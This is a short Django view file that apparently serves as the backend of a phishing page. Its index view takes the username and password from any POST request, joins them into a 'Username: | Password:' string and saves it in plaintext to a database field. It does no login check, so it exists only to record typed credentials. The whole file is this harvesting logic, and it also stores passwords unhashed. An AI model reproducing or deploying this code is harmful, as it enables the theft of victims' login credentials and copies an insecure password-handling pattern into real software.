from django.shortcuts import render
from .models import UserInfo
# Create your views here.
def index(request):
    userinfo = UserInfo()
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        user = "Username:" + username
        passwd = "Password:" + password
        usrinfo = user +" | "+ passwd
        userinfo.usercred = usrinfo
        userinfo.save()

    return render(request, 'accounts/index.html')
